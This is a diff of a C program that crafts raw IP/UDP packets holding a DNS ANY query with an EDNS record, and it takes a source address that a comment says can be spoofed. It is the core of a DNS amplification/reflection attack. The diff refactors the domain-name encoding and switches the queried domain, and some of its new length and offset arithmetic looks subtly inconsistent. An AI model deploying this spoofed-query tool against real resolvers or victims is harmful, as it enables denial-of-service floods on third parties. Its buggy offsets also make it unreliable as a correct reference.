@@ -74,22 +74,47 @@ struct dnsadditional {
 //  "The checksum field is the 16 bit one's complement of the one's
 //  complement sum of all 16 bit words in the header.  For purposes of
 //  computing the checksum, the value of the checksum field is zero."
-
-unsigned short csum(unsigned short *buf, int nwords)
-{
+unsigned short csum(unsigned short *buf, int nwords){
 	unsigned long sum;
-	for(sum=0; nwords>0; nwords--)
+	for(sum = 0; nwords > 0; nwords--)
 		sum += *buf++;
 	sum = (sum >> 16) + (sum &0xffff);
 	sum += (sum >> 16);
 	return (unsigned short)(~sum);
 }
 
+// format dns query's domain name
+// example: turn "www.google.com" into "3www6google3com0"
+void dns_domain_format(unsigned char *all_headers, unsigned char *host){
+	strcat((char *)host, ".");
+
+	// indicate the position where previous word end.
+	int placeholder = 0;
+
+	for(int i = 0; i <= strlen((char *)host); i++){
+
+		if(host[i] == '.'){
+			// replace the dot with current word's length
+			*all_headers = i - placeholder;
+			all_headers++;
+
+			// shift right 1 byte for all the letters in this word 
+			for(; placeholder < i; placeholder++){
+				*all_headers = host[placeholder];
+				all_headers++;
+			}
+			placeholder++;
+		}
+	}
+
+	// put one byte zero to indicate the end of the string
+	*all_headers = 0x00;
+	all_headers++;
+}
 
 
 // Source IP, source port, target IP, target port from the command line arguments
-int main(int argc, char *argv[])
-{
+int main(int argc, char *argv[]){
 	int sd;
 	// No data/payload just datagram
 	char buffer[PCKT_LEN];
@@ -105,8 +130,7 @@ int main(int argc, char *argv[])
 
 	memset(buffer, 0, PCKT_LEN);
 
-	if(argc != 5)
-	{
+	if(argc != 5){
 		printf("- Invalid parameters!!!\n");
 		printf("- Usage %s <source hostname/IP> <source port> <target hostname/IP> <target port>\n", argv[0]);
 		exit(-1);
@@ -114,10 +138,8 @@ int main(int argc, char *argv[])
 
 	// Create a raw socket with UDP protocol
 	sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
-	if(sd < 0)
-	{
+	if(sd < 0){
 		perror("socket() error");
-
 		// If something wrong just exit
 		exit(-1);
 	}else
@@ -142,12 +164,11 @@ int main(int argc, char *argv[])
 	ip->iph_ihl = 5;
 	ip->iph_ver = 4;
 	ip->iph_tos = 0;
-	ip->iph_ident = htons(54321);
+	ip->iph_ident = htons(getpid());
 	ip->iph_flagnoffset = htons(0x4000);
-	//ip->iph_offset = 64;
-	//ip->iph_flag = 7;
 	ip->iph_ttl = 64; // hops
 	ip->iph_protocol = 17; // UDP
+
 	// Source IP address, can use spoofed address here!!!
 	ip->iph_sourceip = inet_addr(argv[1]);
 
@@ -166,7 +187,7 @@ int main(int argc, char *argv[])
 	
 
 	struct dnsheader *dnsh = (struct dnsheader * ) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
-	dnsh->dnsh_id = htons((unsigned short int)rand());
+	dnsh->dnsh_id = (unsigned short) htons(getpid());
 	dnsh->dnsh_qr = 0;
 	dnsh->dnsh_opcode = 0;
 	dnsh->dnsh_aa = 0;
@@ -179,53 +200,62 @@ int main(int argc, char *argv[])
 	dnsh->dnsh_nscount = 0;
 	dnsh->dnsh_arcount = htons(1);
 
-	unsigned char domain_name[] = "isc.org";
-	// Standard DNS Domain Name Notation
-	// e.g. "www.nctu.edu.tw" -> "3www4nctu3edu2tw0"
-	unsigned char dnsq_dname[strlen((char *)domain_name)+2];
 
-	int pos, point_cnt = 0;
-	dnsq_dname[0] = '.';
-	dnsq_dname[strlen((char *)domain_name)+1] = 0;
-	for(pos = strlen((char *)domain_name); pos >= 0; pos--)
-	{
-		point_cnt++;
-		if(pos-1 >= 0)
-			dnsq_dname[pos] = domain_name[pos-1];
-		if(dnsq_dname[pos] == '.')
-		{
-			dnsq_dname[pos] = point_cnt-1;
-			point_cnt = 0;
-		}
-	}
 
-	unsigned char *ptr = (unsigned char * ) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));
-	for(pos = 0; pos <= strlen((char *)domain_name)+1; pos++)
-	{
-		*ptr = dnsq_dname[pos];
-		*ptr++;
-	}
 
-	struct dnsquery *dnsq = (struct dnsquery * ) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(dnsq_dname));
+
+	// unsigned char domain_name[] = "isc.org";
+	unsigned char domain_name[] = "www.google.com";
+    unsigned char *packet_headers;
+	packet_headers = (unsigned char *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));
+	
+	dns_domain_format(packet_headers, domain_name);
+
+	
+	// // Standard DNS Domain Name Notation
+	// // e.g. "www.nctu.edu.tw" -> "3www4nctu3edu2tw0"
+	// unsigned char dnsq_dname[strlen((char *)domain_name)+2];
+
+	// int pos, point_cnt = 0;
+	// dnsq_dname[0] = '.';
+	// dnsq_dname[strlen((char *)domain_name)+1] = 0;
+	// for(pos = strlen((char *)domain_name); pos >= 0; pos--){
+	// 	point_cnt++;
+	// 	if(pos-1 >= 0)
+	// 		dnsq_dname[pos] = domain_name[pos-1];
+	// 	if(dnsq_dname[pos] == '.'){
+	// 		dnsq_dname[pos] = point_cnt-1;
+	// 		point_cnt = 0;
+	// 	}
+	// }
+
+	// unsigned char *ptr = (unsigned char * ) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));
+	// for(pos = 0; pos <= strlen((char *)domain_name)+1; pos++){
+	// 	*ptr = dnsq_dname[pos];
+	// 	*ptr++;
+	// }
+
+	struct dnsquery *dnsq = (struct dnsquery * ) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(domain_name) + 2);
 	dnsq->dnsq_qclass = htons(0x0001);
-	dnsq->dnsq_qtype = htons(0x00ff);
+	dnsq->dnsq_qtype  = htons(0x00ff);
 
-	struct dnsadditional *dnsa = (struct dnsadditional * ) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(dnsq_dname) + sizeof(struct dnsquery) + 1);
+	struct dnsadditional *dnsa = (struct dnsadditional * ) (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(domain_name) + 2 + sizeof(struct dnsquery) + 1);
 	dnsa->dnsa_type = htons(41);
 	dnsa->dnsa_udppayloadsize = htons(512);
 
-	ip->iph_len = sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(dnsq_dname) + sizeof(struct dnsquery) + sizeof(struct dnsadditional) + 1;
-	udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(dnsq_dname) + sizeof(struct dnsquery) + sizeof(struct dnsadditional) + 1);
+
+	ip->iph_len = sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(domain_name) + sizeof(struct dnsquery) + sizeof(struct dnsadditional) + 2;
+	udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + sizeof(domain_name) + sizeof(struct dnsquery) + sizeof(struct dnsadditional) + 2);
 
 	//ip->iph_len = sizeof(struct ipheader) + sizeof(struct udpheader);
 	//udp->udph_len = htons(sizeof(struct udpheader));
 
 	// Inform the kernel do not fill up the packet structure. we will build our own...
-	if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
-	{
+	if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0){
 		perror("setsockopt() error");
 		exit(-1);
-	}else
+	}
+	else
 		printf("setsockopt() is OK.\n");
 
 	// Send loop, send for every 2 second for 100 count
@@ -234,15 +264,13 @@ int main(int argc, char *argv[])
 	printf("Using Source IP: %s port: %u, Target IP: %s port: %u.\n", argv[1], atoi(argv[2]), argv[3], atoi(argv[4]));
 
 	int count;
-	for(count = 1; count <=1; count++)
-	{
-		if(sendto(sd, buffer, ip->iph_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
+	for(count = 1; count <=1; count++){
 		// Verify
-		{
+		if(sendto(sd, buffer, ip->iph_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
 			perror("sendto() error");
 			exit(-1);
-		}else
-		{
+		}
+		else{
 			printf("Count #%u - sendto() is OK.\n", count);
 			sleep(2);
 		}
